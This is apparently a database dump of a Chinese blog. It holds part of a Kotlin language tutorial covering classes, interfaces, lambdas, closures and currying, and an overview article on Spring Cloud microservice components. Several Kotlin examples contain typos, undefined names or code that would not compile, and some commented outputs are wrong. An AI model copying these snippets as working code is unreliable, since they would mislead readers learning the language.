str.toInt()\n}\noverride fun toString(): String {\n    return \"$a___ $b\"\n}\nfun main(args: Array<String>) {\n    val c1 = Complex(5.0,3.0)\n    println(c1 + 7) // 12__3\n    println(c1 + \"20\") // 25.0\n}\n/* 其他运算符的重写方法名\n*  a + b    a.plus(b)\n*  a - b    a.minus(b)\n*  a * b    a.times(b)\n*  a / b    a.div(b)\n*  a % b    a.rem(b)\n*  a..b     a.rangTo(b)\n* */\n```\n## 接口\n接口与Java中的接口一样\n```kotlin\ninterface Parent {\n    fun input()\n    // 与JDK8一样，接口可以有自己的默认方法,且不要求子强制实现 \n    fun interDefault() {\n    	println(\"default\")\n    }\n}\ninterface A: Parent\ninterface B: Parent\n\nclass AX:A {\n    override fun input(){\n        println(\"add AX\")\n    }\n}\nclass BX:B {\n    override fun input(){\n        println(\"add BX\")\n    }\n    fun \n}\n\nclass S {\n    fun addA(a:A) = a.input()\n    fun addB(b:B) = b.input()\n    fun addAny(p:Parent) {\n        when(p) {\n            is A -> {addA(p)}\n            is B -> {addB(p)}\n            else -> throw IllegalArgumentException(\"not found\")\n        }\n    }\n}\n\nfun main(args: Array<String>) {\n    val s = S()\n    s.addAny(AX())\n    s.addAny(BX())\n    AX().interDefault() // 调用默认方法\n} \n```\n## 抽象类\n```kotlin\nabstract class A{\n	var i = 0\n	// open 可被覆盖的方法\n	open fun h1() {\n	\n	}\n	// 抽象方法，默认包含open\n	abstact fun h2() {\n	\n	}\n}\nclass X() :A(){ \n    // 复写方法  \n	override fun h1() {\n  \n    }\n    override fun h2() {\n\n    }\n}\n``` \n## 方法签名冲突\n```kotlin\n/*\n* 父类需要open才可以被继承\n* 父类方法,属性需要open才可以被覆写\n* 接口,接口方法,抽象类默认为open\n* 覆写父类(接口)方法成员都需要override关键字\n* 注意继承类时实际上调用了父类构造方法\n*\n* 接口方法\n* 签名一致且返回值相同的冲突\n* 子类必须实现覆写冲突方法\n* super<[父类(接口)名]>.[方法名]([参数列表])\n* */\nabstract class A {\n    open fun x():Int = 5\n}\ninterface B {\n    fun x():Int = 1\n}\ninterface C {\n    fun x():Int = 0\n} \n\nclass D(var y:Int = 0):A(),B,C {\n    // 签名要一致\n    // 方法名，参数列表，返回值\n    override fun x(): Int {\n        if(y > 0) {\n            return y\n        } else if(y< -200){\n            return super<C>.x()\n        } else if(y< -100) {\n            return super<B>.x()\n        }  else {\n            return super<A>.x()\n        }\n    }\n}\nfun main(args: Array<String>) {\n    println(D(3).x()) // 3\n    println(D(-10).x()) // 5\n    println(D(-110).x())// 1\n    println(D(-210).x())// 0\n}\n```\n## 继承\n```kotlin\n// 不是抽象类的继承，必须加open\n// 继承和重写都要加open\nopen class Parent(open val age:Int) {\n	open fun work(){}\n}\n// 将构造器接收到的参数传入父类构造器\nclass A(age:Int):Parent(age) {\n	override val age:Int\n	get() = 0\n	override fun work(){\n		println(\"A work\")\n	}\n}\nclass B(arg:Int):Parent(age) {\n 	override fun work() {\n		println(\"B work\")\n	}\n}\nfun main(args: Array<String>) {\n	val a = A(20)\n	a.work() // A work\n	println(a.age)// 0\n	val b = B(20)\n	b.work() // B work\n	println(b.age)// 20\n}\n```\n## object单例\n```kotlin\nclass Driver\nabstract class Player\ninterface OnExtennalDriverMountListen {\n	fun onMount(driver:Driver)\n	fun onUnMount(driver:Driver)\n}\n// 只有一个实例的类,kotlin实现的单例\n// 不能自定义构造方法\nobject MusicPlayer:Player(),OnExtennalDriverMountListen  {\n	override fun onMount(driver:Driver){\n	}\n	override fun onUnMount(driver:Driver){	\n	}	\n}\n```\n## 重载\n尽量不使用重载，容易混淆\n```kotlin\nclass O{\n    fun a():Int {\n        return 0\n    }\n    // 重载只能改签名(方法名和参数列表)\n    fun a(int:Int = 0):Int {\n        return int\n    }\n    @JvmOverloads\n    fun a(string:String):Int {\n        return string.length\n    }\n}\nfun main(args: Array<String>) {\n    val o= O()\n    o.a() // 0\n    o.a(int=8) // 8 \n    o.a(\"HelloWorld\") // 10\n	\n}\n```\n## data数据类\n数据类会完成一些类的常用方法,比如toString,copy\n```kotlin\n// data关键字数据类,生成各种方法\n// 生成component\n// 数据类默认没有无参构造器且被final修饰无法被继承\n// 可以使用noArg和allopen插件解决这个问题\ndata class Country(val id:Int,val name:String)\n\nfun main(args: Array<String>) {\n	val china = Country(0,\"中国\")\n	// 数据类会自动完成一些类方法比如toString\n	println(china)\n	// 每个参数都是一个component\n	println(china.component1())// 0\n	println(china.component2())// 中国\n	// 取component,类似于解构\n	var (id,name) = china\n	println(id);println(name)\n	for ((index,value) in args.withIndex()) {\n		println(value)\n	}\n}\n```\n重写component\n```kotlin\n// 非dataClass自己定义component\nclass ComponentX{\n    operator fun component1():String {\n        return \"你好，我是\"\n    }\n    operator fun component2():Int {\n        return 0\n    }\n    operator fun component3():Int {\n        return 1\n    }\n}\nfun main(vararg args:String){\n	  val componentX = ComponentX()\n   	  val (a,b,c) = componentX\n    	  println(\"$a $b $c\")// 你好，我是 \n}\n```\n## 内部类和匿名内部类\n```kotlin\n// 静态内部类不持有外部类的状态\n// kotlin内部类默认是静态，Java内部类默认是非静态\n// 添加inner关键字说明是非静态内部类\nopen class Outter{\n	val a:Int = 0\n	inner class Inner{\n		val a:Int = 5\n		fun hello(){\n			// 相当于Java中的Outter.this.a\n			println(this@Outter.a) // 0\n			println(a) // 5\n		}\n	} \n}\ninterface OnClickListener {\n	fun onClick()\n}\nclass View{\n	var onClickListener:OnClickListener?=null\n}\nfun main(vararg args:String) {\n	var inner = Outter().Inner()\n	inner.hello()\n	val view = View()\n	// 匿名内部类\n	// kotlin的匿名内部类可以继承其他类\n	view.onClickListener = object:Outter(),OnClickListener{\n		override fun onClick(){\n			\n		}\n	}\n}\n```\n## 枚举\n```kotlin\nenum class LogLevel(val id:Int){\n	VERBOSE(0),DEBUG(1),INFO(2),WARN(3),ERROR(4),ASSERT(5);\n    fun getTag():String {\n	// id数字和枚举名字\n        return \"$id, $name\"\n    } \n    override fun toString(): String {\n        return \"$name,$ordinal\"\n    }\n}\n// 枚举相当于下面的代码\nclass LogLevel2 protected constructor(){\n    companion object {\n        val VERBOSE = LogLevel2()\n        val DEBUG = LogLevel2()\n        val INFO = LogLevel2()\n        val WARN = LogLevel2()\n        val ERROR = LogLevel2()\n        val ASSERT = LogLevel2()\n    }\n} \nfun main(args: Array<String>) {\n    println(LogLevel.DEBUG.getTag()) // 1,DEBUG\n    println(LogLevel.DEBUG.ordinal) // 1\n    LogLevel.values().map(::println) // 0,VERBOSE 1,DEBUG...\n    println(LogLevel.valueOf(\"error\".toUpperCase()))// ERROR,4 \n}\n```\n## 密封类\n```kotlin\n// 子类可属，与枚举很像\n// 子类需要和密封类在同一个文件中\n// 无参数的使用object\nsealed class PlayerCmd {\n    class Play(val url:String,val position:Long = 0):PlayerCmd()\n    class Seek(val position: Long):PlayerCmd()\n    object Pause:PlayerCmd()\n    object Resume:PlayerCmd()\n    object Stop:PlayerCmd()\n} \n\nenum class PlayerState{\n    Stop,PLAYER,Pause\n} \n```\n\n## 伴生对象替代静态\n```kotlin\n/*\n* 每个类可以对应一个伴生对象\n* 伴生对象的成员全局独一份\n* 伴生对象的成员类似Java的静态成员 \n* 添加JvmStatic JvmField使得Java代码可以调用这些伴生对象成员\n* 静态成员考虑用包级函数,变量替代\n* */\nclass A private constructor(val value:Double){\n	companion object {\n		@JvmStatic\n		fun ofDouble(double:Double):A{\n			return A(double)\n		}\n		@JvmStatic\n		fun ofA(a:A):A {\n			return A(a.value)\n		}\n		@JvmField\n		var TAG:String = \"A\"\n	}\n}\nfun main(vararg args:String) {\n	var a1 = A.ofDouble(10.0)\n	var a2 = A.ofA(a1)\n	println(A.TAG)\n}\n```\n## 属性代理\n属性代码可以分离复杂逻辑\n```kotlin\nclass Delegates {\n	val h1 by lazy{\n		\"HelloWorld\"\n	}\n	val h2 by X()\n	val h3 by X()\n}\nclass X{\n	private var value:String?=null\n	// setValue getValue\n	// thisRef:调用者 \n	// property:调用的成员\n	operator fun setValue(thisRef: Any?,property: KProperty<*>,value:String) {\n        println(\"setValue:$thisRef->${property.name} = $value\") \n        this.value = value\n    } \n	operator fun getValue(thisRef: Any?,property: KProperty<*>):String {\n        println(\"getValue:$thisRef->${property.name}\")\n        return value?:\"Hello\"\n    } \n}\nfun main(args: Array<String>) {\n	val delegates = Delegates()\n	println(delegates.h1)// HelloWorld\n	println(delegates.h2)// Hello\n	println(delegates.h3)// Hello\n	delegates.hello3 = \"H3\"\n	println(delegates.h3)// H3	\n}\n```\n## 接口代理\n```kotlin\ninterface Driver {\n    fun drive()\n}\ninterface Write {\n    fun write()\n}\nclass Manage:Driver,Write {\n    override fun drive() {\n    }\n    override fun write() {\n    }\n}\n// 不使用接口代理\nclass SeniorManage(val driver:Driver,val write:Write):Driver,Write{\n    override fun drive() {\n        driver.drive()\n    }\n    override fun write() {\n        write.write()\n    }\n} \n// 使用接口代理\nclass SeniorManage2(val driver:Driver,val write:Write):Driver by driver,Write by write\n\n// 两个实现类\nclass CarDriver:Driver {\n    override fun drive() {\n        println(\"开车\")\n    }\n}\nclass PPTWrite:Write {\n    override fun write() {\n        println(\"做PPT\")\n    }\n}\n\nfun main(args: Array<String>) {\n    val driver = CarDriver()\n    val write = PPTWrite()\n    val seniorManage = SeniorManage2(driver,write)\n    seniorManage.drive()\n    seniorManage.write()\n}\n```\n## 扩展方法\n```kotlin\n// 扩展运算符 *\noperator fun String.times(int:Int):String {\n    var stringBuilder = StringBuilder()\n    for (i in 0 until int) {\n        stringBuilder.append(this)\n    }\n    return stringBuilder.toString()\n}\n// 扩展方法\nfun String.multiplay(int:Int):String{\n    var stringBuilder = StringBuilder()\n    for (i in 0 until int) {\n        stringBuilder.append(this)\n    }\n    return stringBuilder.toString()\n}\n// 扩展成员\nval String.a:String\nget() = \"abc\"\nvar String.b:Int\nset(value){}\nget() = 5\n \nfun main(args: Array<String>) {\n    println(\"abc\".multiplay(16)) // abcabcabc...\n    println(\"abc\" * 16) // abcabcabc...\n    println(\"abc\".a) // abc\n    println(\"abc\".b) // 5\n}\n```\n## lambda\nlambda函数\n```kotlin\nfun main(args:Array<String>) {\n	println(sum(1,5)) // 6\n	println(sum2(1,6)) // 7\n	// 这种方法也可以调用lambda函数\n	println(sum2.invoke(1,6)) // 7\n}\n// lambda函数\nval sum = {arg1:Int,arg2:Int -> arg1 + arg2}\nval sum2 = {arg1:Int,arg2:Int -> \n	 // 最后一行是返回值\n 	println(\"$arg1 + $arg2 = ${arg1 + arg2}\")\n     arg1 + arg2\n}\n```\n分析输入输出,lambda最重要的是明确输入和输出\n```kotlin\n// (Int,Int) -> Int\nval sum = {arg1:Int,arg2:Int -> arg1 + arg2}\n// () -> Unit\nval pr = { println(\"Hello\") }\n// (Int) -> Long\nval il = {x:Int ->\n	 x.toLong() \n}\n```\n与JDK8中的函数接口类似,kotlin的lambda返回的也是函数接口\n```kotlin\nfun main(args:Array<String>) {\n	 // 有N个参数就是FunctionN,最大数22个\n	 println(one) // Function1 \n	 println(two) // Function2\n}\nval one = {x:Int -> x.toLong() }\nval two = {arg1:Int,arg2:Int -> \n	 // 最后一行是返回值\n 	println(\"$arg1 + $arg2 = ${arg1 + arg2}\")\n     arg1 + arg2\n}\n```\nlambda的遍历方式\n```kotlin\nfun main(args:Array<String>) {\n	// 常规遍历方式\n	for (i in args) {\n		println(i)\n	}\n	// lambda遍历\n	args.forEach({it -> println(it)})\n	// 有时候需要满足一定条件跳出循环\n	// 但直接return 会直接结束当前方法，而不是停止遍历\n	// 跳出lambda表达式,形参名默认值it\n	args.forEach ForEach@{\n		if(it == \"q\") {\n			return@ForEach\n		}\n	}\n	// 如果最后一个参数参数是lambda表达式，那么可以把参数移动到{},参数默认为it\n	args.forEach{ println(it) }\n	// 如果参数和执行方法需要的参数一致，可以简化成函数引用\n	args.forEach(::println)\n}\n```\n## 表达式\n```kotlin\nfun main(args: Array<String>) {\n	// 条件赋值\n	// if表达式可以用来条件赋值\n	val model = if(args.isNotEmpty() && args[0] == \"1\") {\n		1\n	} else {\n		0\n	}\n	// when表达式,也可以用于判断赋值\n	val model2 = when{\n		args.isNotEmpty() && args[0] -> 1\n		else -> 0\n	}\n	// then条件判断\n	val f = 1\n	when(f) {\n		1,2 -> println(\"1 or 2\")\n		else -> println(\"other\")\n	}\n	// then表达式取代switch表达式\n	// 不用break,满足一个条件后下面的不会执行\n	val x = 5\n	when(x) {\n		is Int -> println(\"$x is Int\")\n		in 1..100 -> println(\"$x is in 1..100\")\n		!in 1..100 -> println(\"$x is not in 1..100\")\n		// 与这个数相等\n		args[0].toInt() -> println(\"$x == args[0]\")\n		else -> println(\"not found match\")\n	}\n	// try catch finally\n	// try 也可以用作赋值\n	val result = try {\n		1\n	} catch(e: Exception) {\n		e.printStackTrace()\n		0\n	}\n}\n```\n## 高阶函数方法\n操作list的方法，类似于JDK8中的流编程\n```kotlin\nfun main(vararg args:String) {\n	val list = listOf(1,2,3,4,5,6)\n	// map组成新的list\n	val newList = list.map{ it*2 + 3 }\n	// 使用函数引用更佳\n	val newList2 = list.map(Int::toDouble)\n	// flatMap拍平组成新的list\n	var list2 = listOf(1..2,2..5,100.322)\n	var flatList = list2.flatMap {\n		it.map {\n			\"No,$it\"\n		}\n	}\n	// reduce根据前后值生成数据\n	val sum = flatList2.reduce { acc, s -> acc + s }\n	// fold指定初始值的reduce\n	// 你甚至可以放个StringBuild进去作为第一个参数\n	(0..6).map(::factorial).fold(StringBuild()) {\n		acc,i -> acc.append(i).append(\",\")\n	}\n	// foldRight与上面相反，从最后开始数据执行\n	(0..6).map(::factorial).foldRight(StringBuild()) {\n		i,acc -> acc.append(i).append(\",\")\n	}\n	// filter过滤满足条件的数据组成新list\n	(0..6).map(::factorial).filter{ it%2 == 1}\n	// filterIndexed包含index\n	(0..6).map(::factorial).filterIndexed{ index,i -> index% 2 == 1 }\n	// takeWhile遇到不符合条件的情况结束\n	(0..6).map(::factorial).takeWhile { it % 2 == 1 }\n	// 链接字符串\n	println((0..6).joinToString(\",\"))\n}	\n\n// 生成数列\nfun factorial(n:Int):Int {\n    if (n == 0)return 1\n    return (1..n).reduce{ acc,i -> acc * i }\n}\n```\n操作对象的方法\n```kotlin\ndata class Person(){\n	fun work(){\n		println(\"$name is working!!!\")\n	}\n}\nfun findPerson():Person?{\n    return Person(\"程序员\",20)\n}\nfun main(args: Array<String>){\n    findPerson()?.let { person ->\n        println(person.name)\n        person.work()\n    }\n    // 内部相当于得到person对象\n    findPerson()?.apply {\n        work()\n        println(age)\n    }\n    val bar = BufferedReader(FileReader(\"file.txt\"))\n    BufferedReader(FileReader(\"file.txt\")).readText()\n    // with{}中的this相当于bar\n    with(bar){\n        var line:String?\n        while(true){\n            line = readLine()?:break\n            println(line)\n        }\n        close()\n    }\n    // user中做了一些额外操作，比如关闭流\n    BufferedReader(FileReader(\"file.txt\")).use{\n        var line:String?\n        while(true){\n            line = it.readLine()?:break\n            println(line)\n        }\n    }\n}\n```\n其他方法\n```kotlin\nfun main(args: Array<String>) {\n	val map = HashMap<Char,Int>()\n	 // 统计文件的字符串个数\n	 // filterNot去除符合条件的数据\n    File(\"build.gradle\").readText().toCharArray().filterNot(Char::isWhitespace).forEach{\n        val count = map[it]\n        if(count == null) map[it] = 1\n        else map[it] = count + 1\n    } \n}\n// groupBy分组\n// to关键字变为(key,size)的格式 \nFile(\"build.gradle\").readText().toCharArray().filterNot(Char::isWhitespace)            \n .groupBy { it }.map { it.key to it.value.size }.forEach(::println)\n```\n\n## 尾递归转迭代优化\n尾递归:调用自身后无其他操作的递归  \n递归会造成大量多余空间消耗,所以可以将尾递归向迭代进行转换\n```kotlin\ndata class ListNode(val value:Int,var next:ListNode?=null)\nfun factorial(n:Long):Long{\n    return n * factorial(n-1)\n}\n// tailrec将尾递归编译成迭代\ntailrec fun findListNode(head:ListNode?,value:Int):ListNode?{\n    head?:return null\n    if (head.value == value) {\n        return head\n    }\n    return findListNode(head.next,value) \n}\nfun main(args: Array<String>) {\n    val MAX_NODE_COUNT = 10\n    val head = ListNode(0)\n    var p = head\n    for (i in 1..MAX_NODE_COUNT) {\n        p.next = ListNode(i)\n        p = p.next!!\n    }\n    findListNode(head,MAX_NODE_COUNT - 2)?.value\n}\n```\n## 闭包\n简单例子\n```kotlin\nvar string = \"HelloWorld\"\n// 返回值是个函数\nfun markFn():()->Unit{\n	var count = 0 \n	return fun() {\n		println(++count)\n	}\n}\n```\n简化写法 \n```kotlin\n// 意思相同\nfun add(x:Int) = fun(y:Int) = x + y\nfun add2(x:Int):(Int) -> Int {\n    return fun (y:Int):Int{\n        return x + y\n    }\n}\nfun main(args: Array<String>) {\n    val add5 = add(5)\n    println(add5(2))\n}\n```\n复杂例子\n```kotlin\n// 闭包，构成函数式编程的基本要素\nfun fibonacci(): Iterable<Long> {\n    var first = 0L\n    var second = 1L\n    return Iterable{\n        object: LongIterator(){\n            override fun nextLong(): Long {\n                var result = second\n                second += first\n                first = second - first\n                return result\n            }\n            override fun hasNext() = true\n        }\n    }\n}\nfun main(args: Array<String>) {\n    for (i in fibonacci()) {\n        if (i > 100) break\n        println(i)\n    }\n}  \n```\n## 复合函数\n将函数进行结果,按前后调用andThen,compose\n```kotlin\nval add5 = {\n    i:Int -> i + 5\n}\nval multiplyBy2 = {\n    i:Int -> i * 2\n}\n// 后缀表达式,修改lambda的函数接口\ninfix fun <P1,P2,R> Function1<P1,P2>.andThen(function:Function1<P2,R>):Function1<P1,R> {\n    return fun(p1:P1):R {\n        return function.invoke(this.invoke(p1))\n    }\n}\ninfix fun <P1,P2,R> Function1<P2,R>.compose(function:Function1<P1,P2>):Function1<P1,R> {\n    return fun(p1:P1):R {\n        return this.invoke(function.invoke(p1))\n    }\n}\nfun main(args: Array<String>) {\n	println(multiplyBy2(add5(8))) \n    val add5AndMultiplyBy2 = add5 andThen multiplyBy2\n    val add5ComposeMultiplyBy2 = add5 compose multiplyBy2\n    println(add5AndMultiplyBy2(8)) // 8+5=13 13*2=26\n    println(add5ComposeMultiplyBy2(8))// 8*2=16 16+5=21\n}\n```\n## 柯里化\n将多个函数编程单函数链\n```kotlin\n// 多函数变单函数\n// 普通函数\nfun log1(tag:String, target: OutputStream, message:Any?){\n    target.write(\"[$tag] $message\\n\".toByteArray())\n}\n// 意思相同\nfun log2(tag:String)\n        = fun(target:OutputStream)\n        = fun (message:Any?)\n        = target.write(\"[$tag] $message\\n\".toByteArray())\n\nfun log3(tag:String): (OutputStream) -> (Any?) -> Unit {\n    return fun(target:OutputStream): (Any?) -> Unit {\n        return fun(message:Any?) {\n            target.write(\"[$tag] $message\\n\".toByteArray())\n        }\n    }\n}\n// 修改lambda函数接口\nfun <P1,P2,P3,R> Function3<P1,P2,P3,R>.curried()\n    = fun(p1:P1) = fun(p2:P2) = fun(p3:P3) = this(p1,p2,p3)\n\nfun main(args: Array<String>) {\n    log1(\"beeny\",System.out,\"HelloWorld\")\n    log2(\"beeny\")(System.out)(\"HelloWorld\")\n    log3(\"beeny\")(System.out)(\"HelloWorld\")\n}\n```\n## 偏函数\n传入部分参数得到的新函数\n```kotlin\nval makeString = fun(byteArray:ByteArray,charset:Charset):String{\n    return String(byteArray,charset)\n}\n// 生成偏函数\nval makeStringFromGbkBytes = makeString.partial2(charset(\"GBK\"))\n// p1:字符串,p2:编码\nfun <P1,P2,R> Function2<P1,P2,R>.partial2(p2:P2) = fun(p1:P1) = this(p1,p2)\nfun <P1,P2,R> Function2<P1,P2,R>.partial1(p1:P1) = fun(p2:P2) = this(p1,p2)\n\nfun main(args: Array<String>) {\n    // 偏函数,传入部分参数得到新函数\n    val bytes = \"技术宅拯救世界\".toByteArray(charset(\"GBK\"))\n    makeStringFromGbkBytes(bytes)\n}\n```', 0, 0, 65, 0, 0, '2018-08-25 20:19:36', '2019-02-22 00:13:47', 0, 0);
INSERT INTO `article` VALUES (18, 1, 'SpringCloud常见用途原理', '2018/8/1535261739_9d6c574abf39bc9cf6ad8c63757ed012.jpg', '## 概念\n### web架构模式\n1. 单点应用: 代码全部在一个项目中,使用包名进行区分com.controller,com.service,com.dao\n2. 面向服务SOA: 向服务接口进行开放,调用方进行远程调用 \n3. 微服务: 将一个项目的服务拆分成多个子服务,子服务使用基于语言通讯方式相互调用(如基于socket的rpc,http)\n\n### 单点应用与面向服务SOA\n![webjg.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546577490_webjg.png)\n1. SOA这种传统方式多为webservice,是一种较为过时的调用技术,这种方式退出了主流\n2. 建议使用google的grpc或apache的thrift代替这种方案\n\n### 微服务\n![webjg2.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546577491_webjg2.png)\n\n#### 分布式开发是什么\n1. 分布式开发就是将一个项目拆分成多个子项目,子项目使用语言通讯方式相互调用(如rpc,http等方式)\n2. 优点: 解决代码冲突,解耦\n3. 缺点: 网络延迟,维护复杂,难以整合,编写复杂\n\n#### 微服务架构与面向服务架构区别\n1. 面向服务架构: http+xml,重量级\n2. 微服务架构: http+json+restful风格,轻量级,更细分\n\n#### 接口怎么管理\n1. 容错机制,负载均衡路由策略,网关,限流,断路\n\n## SpringCloud\n### 基本概念\n#### SpringCloud是什么,与SpringBoot是何关系\n1. SpringCloud是一套完美的微服务解决框架\n2. SpringCloud依赖于SpringBoot依赖于SpringMVC\n3. SpringBoot简化xml配置,快速整合框架,与微服务无关\n\n#### SpringCloud解决什么样的问题\n1. 注册中心,服务发现,服务注册\n2. 接口网关\n3. 远程调用,基于http协议,支持负载均衡\n4. 断路器\n5. 配置中心\n6. 全局锁\n7. 分布式会话\n8. 健康检查\n9. 消息总线与驱动\n\n### eureka注册中心\n#### 服务注册与服务发现\n![springcloudserver.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546577938_springcloudserver.png)\n#### eureka自我保护机制\n1. 为了防止eurekaClient可以正常运行的情况下,但期间网络不通,eurekaServer*误将eurekaClient剔除*(利用心跳包)\n2. eureka不会将长时间无法运行的程序剔除,所以当某服务宕机后,eureka依然会将请求引向该宕机接口服务,生产环境时记得关闭自我保护机制\n\n### ribbon远程调用\n#### ribbon负载均衡\n![ribbon.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546578019_ribbon.png)\n#### ribbon是什么\n1. ribbon是本地负载均衡器\n2. 在调用接口时,会在eureka注册中心上获取注册信息列表,获取之后,*缓存在jvm本地*,本地实现http调用\n\n#### ribbon本地负载均衡客户端与Nginx服务端负载均衡区别\n1. ribbon是本地负载均衡器,适合微服务http调用\n2. nginx是服务器负载均衡,客户端所有请求都会交给nginx,然后在由nginx实现转发,既负载均衡由服务端中间件实现,适合针对于服务端集群(tomcat)\n\n\n### 接口网关\n![gateway.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546578108_gateway.png)\n#### 网关有何作用\n1. 网关拦截所有请求,任何请求先交给接口网关,然后再用网关进行转发\n2. 相关于微服务中的总拦截器过滤器\n\n#### 接口如何设计\n1. 考虑幂等性,安全性(https),防止篡改数据(加签),使用网关拦截黑名单与白名单,json格式restful风格跨平台\n2. 考虑高并发,对接口服务实现保护,服务降级,熔断,隔离之类,编写接口文档\n\n### 断路器hystrix\n#### 概念\n1. *服务雪崩*: 网络延迟,大量请求在处理一个服务,新请求无法被处理\n2. *降级*机制: 超时机制,如果发生错误,不让调用接口,调用本地fallback给一个默认返回\n3. *熔断*机制: 保险丝,达到一定请求压力级别将服务跳闸\n4. *隔离*机制: 每个服务接口隔离开,A与B接口都有独立的线程池\n5. *限流*机制: 预防措施,设置最大阀值\n6. *机制详情解释参考另一篇文章 https://blog.tuwq.cn/article/27* \n\n#### 断路器在何时展现它的功能\n1. 大量请求抵达后端服务器,服务器无法承受如此多的连接,*导致其他服务出现阻塞*,为了保证用户体验与系统稳定,*这时给出一个默认的返回,如服务繁忙,请稍后再试等信息,称之为降级*\n2. 大量请求抵达后端服务器,服务器无法承受,甚至可能导致数据库崩溃,进而导致整个服务系统瘫痪,称之为雪崩,*这时给出一个接口连接上限值,当请求达到或超越上限值时,将接下来的请求全部降级,保证接口不会崩溃,称之为熔断*\n\n#### 熔断与降级有何区别\n1. 熔断是要保护服务提供者，是在服务提供者忙到不行的时候，减少对它的访问量，从而*避免“雪崩效应”*而导致服务提供者的应用实例全部崩溃\n2. 降级是为了让用户得到反馈,当服务繁忙时*给出一个默认返回*\n\n### 配置中心\n![configserver.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546578304_configserver.png)\n#### 配置中心作用\n1. 开发中用于区分环境配置 dev(测试环境),pre(预发布),prd(正式生产环境),uat(用户测试)\n2. SpringCloud配置中心将配置文件信息存放在版本控制(svn,git中))\n3. 配置中心的配置信息可被微服务中所有项目进行读取,相当于总配置文件\n4. 配合actuator或bus消息总线进行不重启项目进行刷新 \n\n### 消息总线\n![msgtotalmsg.png](http://blog.img.tuwq.cn/upload/artimg/2019/3/1553525605_msgtotalmsg.png)\n1. 在微服务架构中,通常会使用轻量级的消息代理来构建一个共用的消息主题来连接各个微服务实例 \n2. *它广播的消息会被所有在注册中心的微服务实例监听和消费,也称为消息总线*\n3. 消息代理属于中间件,设计代理的目的就是为了能够从应用程序中传入消息,并执行一些特别的操作\n4. 消息总线其实通过消息中间主题模式,它使用广播消息的机制让所有在注册中心微服务实例进行监听和消费,以广播形式将消息推送给所有注册中心服务列表\n5. 比如配合配置中心进行无重启刷新 /actuator/refresh或/actuator/bus-refresh\n6. 其原理即是利用了消息队列,并将所有服务注册为消费者\n\n### 消息驱动\n![msgdriver.png](http://blog.img.tuwq.cn/upload/artimg/2019/3/1553526153_msgdriver.png)\n1. 消息驱动可以简化开发人员对消息中间件的使用复杂度,让系统开发人员更多精力专注于核心业务逻辑的开发\n2. *底层实现依靠stream组件对rabbitmq和kafka进行封装成同一个API,开发人员只需要对接stream即可*\n3. 通过定义绑定器作为中间层,实现了应用程序与消息中间件细节之间的隔离,通过应用程序暴露统一的channel通过\n4. 使用应用程序暴露统一的channel通道,使得应用程序不需要考虑各种不同的消息中间件实现\n5. 当需要升级消息中间件,或是更换其他消息中间件产品时,我们需要做的就是更换对应的Bind绑定器而不需要修改任何应用逻辑\n\n### 服务跟踪zipkin+sleuth\n#### zipkin\n![sleuth.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555232423_sleuth.png)\n1. zipkin是一个开放源代码分布式的跟踪系统,由推特开源,致力于收集服务的定时数据,以解决微服务架构中的延迟问题,包括数据的收集,存储,查找和展现\n2. 每个服务向zipkin报告计时数据,例如用户每次请求服务的处理时间等,可方便的监测系统中存在的瓶颈,zipkin会根据调用关系通过zipkinUI生成*依赖关系图(调用链)*\n\n#### sleuth\n1. sleuth为服务之间调用提供链路追踪,通过sleuth可以清除的了解到一个服务请求经过了哪些服务,每个服务处理花费多长,从而让我们可以很方便的理清各微服务间的调用关系,此外sleuth可以帮助我们更多\n2. 耗时分析: 通过sleuth可以很方便的了解到每个采样请求的耗时,从而分析出哪些服务调用比较耗时\n3. 可视化错误: 对于程序未捕捉的异常,可以通过集成zipkin服务界面上看到\n4. 链路优化: 对于调用比较频繁的服务,可以针对这些服务实施一些优化措施\n5. sleuth可以结合zipkin,将信息发送到zipkin,利用zipkin的存储来存储信息,利用zipkinUI来展示数据\n\n#### 服务跟踪原理\n![sleuth2.png](http://blog.img.tuwq.cn/upload/artimg/2019/4/1555232423_sleuth2.png)\n1. 为了实现请求跟踪,当请求发送到分布式系统的入口端点时,只需要服务跟踪框架为该请求创建一个唯一的跟踪标识,同时在分布式系统内部流转的时候,框架始终保持传递该唯一标识,直到返回给请求方为止这个唯一id就是*traceId*,通过traceId的记录,我们就能将所有请求过程的日志关联起来\n2. 为了统计各处理单元的时间延迟,当请求到达各个服务组件时,或是处理逻辑到达某个状态时,也通过一个唯一标识来标记它的开始,具体过程以及结束,这个唯一标识就是*spanId*,对于每个span来说,它必须有开始或结束两个节点,通过记录开始span和结束span的时间戳,就能统计出该span的时间延迟,除了时间戳记录之外,它还可以包含一些其他元数据,比如事件名称,请求信息等\n3. 为了记录处理单元的上一次处理单元的服务组件请求,所有记录了*parentId*,首个服务的parentId为null,traceId记录整个调用链全局id,spanId记录每一次请求,parentId记录每一次请求的上一次请求的id\n\n### SpringCloud常用注解\n1. @EnableEurekaServer	创建eureka注册中心\n2. @EnableEurekaClient	注册到eureka\n3. @LoadBalanced		使restTemplate支持ribbon负载均衡\n4. @EnableZuulProxy	开启zuul网关 \n5. @EnableConfigServer 开启配置中心\n6. @EnableFeignClients 开启feign客户端\n7. @HystrixCommand 	配置断路器参数', 2, 1, 114, 0, 3, '2018-08-26 13:35:52', '2019-09-04 23:28:04', 0, 0);
